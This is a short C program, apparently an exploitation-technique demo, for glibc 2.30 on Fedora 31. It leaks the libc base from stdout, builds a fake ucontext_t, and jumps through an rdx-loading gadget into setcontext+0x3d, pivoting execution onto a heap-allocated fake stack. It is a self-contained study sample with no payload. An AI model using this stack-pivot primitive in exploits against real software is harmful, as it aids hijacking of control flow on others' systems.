/**
 * System
 *  Fedora release 31 (Thirty One)
 *  GNU/Linux 5.6.13-200.fc31.x86_64
 *  ldd (GNU libc) 2.30
 * 
 * Compile
 *  gcc setcontext_trick.c -g -o setcontext_trick
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <ucontext.h>

size_t leak_libc() {
    return (size_t)stdout - 0x1c3500;
}

void call(void* p, size_t arg) {
    void (*func_ptr)(size_t) = p;
    func_ptr(arg);
}

int main() {
    size_t* fake_stack = malloc(0x200);
    for (int i = 0; i < 10; i++) fake_stack[i] = 0xdeadbeef;

    size_t setcontext_addr = leak_libc() + 0x4c290;
    void* load_rdx = (void*)(leak_libc() + 0x12ff40);

    ucontext_t* ucp = calloc(sizeof(ucontext_t), 1);
    ucp->uc_mcontext.gregs[REG_RSP] = (size_t)fake_stack; // new stack

    size_t* raw_ucp = (size_t*)ucp;
    raw_ucp[1] = (size_t)ucp; // [rdi+0x8]  = &ucp => rdx = &ucp
    raw_ucp[4] = setcontext_addr + 0x3d;   // [rdx+0x20] = setcontext+0x3d

    call(load_rdx, (size_t)ucp);

    return 0;
}
